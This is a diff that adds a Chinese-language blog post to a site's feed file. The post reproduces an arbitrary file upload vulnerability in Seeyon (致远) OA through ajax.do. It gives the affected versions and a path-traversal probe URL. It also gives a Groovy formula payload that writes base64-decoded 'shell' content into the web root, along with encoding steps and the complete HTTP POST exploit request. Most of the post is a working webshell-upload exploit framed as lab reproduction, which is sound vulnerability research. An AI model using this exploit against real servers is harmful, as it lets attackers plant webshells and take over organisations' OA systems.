@@ -131,6 +131,33 @@
     
     
     <entry>
+      <title>致远ajax.do 任意文件上传</title>
+      <link href="2021/01/08/%E8%87%B4%E8%BF%9Cajax-do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+      <url>2021/01/08/%E8%87%B4%E8%BF%9Cajax-do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="漏洞影响范围："><a href="#漏洞影响范围：" class="headerlink" title="漏洞影响范围："></a>漏洞影响范围：</h2><pre><code>致远OA V8.0致远OA V7.1、V7.1SP1致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3致远OA V6.0、V6.1SP1、V6.1SP2致远OA V5.x致远OA G6</code></pre><h2 id="自己搭建好测试环境"><a href="#自己搭建好测试环境" class="headerlink" title="自己搭建好测试环境"></a>自己搭建好测试环境</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1.webp" alt="image"></p><h2 id="复测过程"><a href="#复测过程" class="headerlink" title="复测过程"></a>复测过程</h2><h4 id="验证是否存在漏洞漏洞文件"><a href="#验证是否存在漏洞漏洞文件" class="headerlink" title="验证是否存在漏洞漏洞文件"></a>验证是否存在漏洞漏洞文件</h4><pre><code>http://192.168.1.18:8080/seeyon/autoinstall.do/..;/ajax.do</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1614307043(1).webp" alt="image"></p><h5 id="出现-“出现异常：java-lang-NullPointerException-null-”-则存在漏洞组件可能存在漏洞！"><a href="#出现-“出现异常：java-lang-NullPointerException-null-”-则存在漏洞组件可能存在漏洞！" class="headerlink" title="出现 “出现异常：java.lang.NullPointerException:null ” 则存在漏洞组件可能存在漏洞！"></a>出现 “出现异常：java.lang.NullPointerException:null ” 则存在漏洞组件可能存在漏洞！</h5><h4 id="使用poc进行漏洞利用"><a href="#使用poc进行漏洞利用" class="headerlink" title="使用poc进行漏洞利用"></a>使用poc进行漏洞利用</h4><pre><code>[&#123;&#39;formulaType&#39;: 1, &#39;formulaName&#39;: &#39;test&#39;, &#39;formulaExpression&#39;: &#39;String path = &quot;../webapps/seeyon/&quot;;        java.io.PrintWriter printWriter2 = new java.io.PrintWriter(path+&quot;文件名.txt&quot;);        String shell = &quot;需要上传的内容base64编码放入此处&quot;;        sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();        String decodeString = new String(decoder.decodeBuffer(shell),&quot;UTF-8&quot;);        printWriter2.println(decodeString);        printWriter2.close();&#125;;test();def static xxx()&#123;&#39;&#125;, &#39;&#39;, &#123;&#125;, &#39;true&#39;]</code></pre><h4 id="修改好上述poc-内容后进行gzip加密后再进行url编码即可得到漏洞利用数据"><a href="#修改好上述poc-内容后进行gzip加密后再进行url编码即可得到漏洞利用数据" class="headerlink" title="修改好上述poc 内容后进行gzip加密后再进行url编码即可得到漏洞利用数据"></a>修改好上述poc 内容后进行gzip加密后再进行url编码即可得到漏洞利用数据</h4><h3 id="加密与利用过程"><a href="#加密与利用过程" class="headerlink" title="加密与利用过程"></a>加密与利用过程</h3><h6 id="将需要上传的内容进行base64编码"><a href="#将需要上传的内容进行base64编码" class="headerlink" title="将需要上传的内容进行base64编码"></a>将需要上传的内容进行base64编码</h6><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/23234234.webp" alt="image"></p><h6 id="替换poc内String-shell内容-修改上传文件名"><a href="#替换poc内String-shell内容-修改上传文件名" class="headerlink" title="替换poc内String shell内容 修改上传文件名"></a>替换poc内String shell内容 修改上传文件名</h6><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84poc.webp" alt="image"></p><h6 id="进行gzip与url编码"><a href="#进行gzip与url编码" class="headerlink" title="进行gzip与url编码"></a>进行gzip与url编码</h6><pre><code>在线加密工具https://ailiqun.xyz/%E5%9C%A8%E7%BA%BF%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B.webp" alt="image"></p><h6 id="最终得到利用数据包为"><a href="#最终得到利用数据包为" class="headerlink" title="最终得到利用数据包为"></a>最终得到利用数据包为</h6><pre><code>POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1Host: 127.0.0.1Connection: closeCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9loginPageURL=; login_locale=zh_CN;Content-Type: application/x-www-form-urlencodedmanagerMethod=validate&amp;arguments=进行gzip与url编码后的poc内容</code></pre><h6 id="使用burp发送数据包进行漏洞利用"><a href="#使用burp发送数据包进行漏洞利用" class="headerlink" title="使用burp发送数据包进行漏洞利用"></a>使用burp发送数据包进行漏洞利用</h6><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%88%A9%E7%94%A8%E6%88%90%E5%8A%9F.webp" alt="image"></p><h6 id="利用成功"><a href="#利用成功" class="headerlink" title="利用成功"></a>利用成功</h6><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E9%AA%8C%E8%AF%81.webp" alt="image"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 致远OA </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>加密杂项</title>
       <link href="2020/11/02/%E6%9D%82%E9%A1%B9/"/>
       <url>2020/11/02/%E6%9D%82%E9%A1%B9/</url>
